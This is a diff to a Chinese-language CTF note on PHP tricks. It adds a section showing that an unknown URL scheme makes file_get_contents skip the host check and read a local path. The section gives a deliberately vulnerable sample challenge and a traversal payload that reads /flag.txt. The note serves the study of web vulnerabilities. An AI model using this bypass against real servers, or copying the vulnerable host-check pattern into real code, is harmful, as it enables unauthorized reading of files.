@@ -688,7 +688,43 @@ PHP需要将所有参数转换为一个有效的变量名，所以当解析查�
 
 
 
-## file_get_contents和include对data协议的解析不一致
+### 不存在的协议忽略hosts直接读取path指向的文件
+
+0://localhost@great.ctf/../../../../../../../../flag.txt，读取/flag.txt
+
+例题：
+
+```php
+<?php
+$argv[1]=$_GET['a'];
+if(filter_var($argv[1],FILTER_VALIDATE_URL))
+{
+        $r = parse_url($argv[1]);
+        print_r($r);
+        if(preg_match('/great\.ctf$/',$r['host']))
+        {
+                $a=file_get_contents($argv[1]);
+                echo($a);
+        }else
+        {
+                echo("error");
+        }
+
+}else
+{
+        echo "Error:Invalid URL; WhereIsSourceCode ";
+}
+?>
+~      
+```
+
+0://localhost@great.ctf/../../../../../../../../flag.txt
+
+
+
+
+
+### file_get_contents和include对data协议的解析不一致
 
 file_get_contents会解析data协议
 
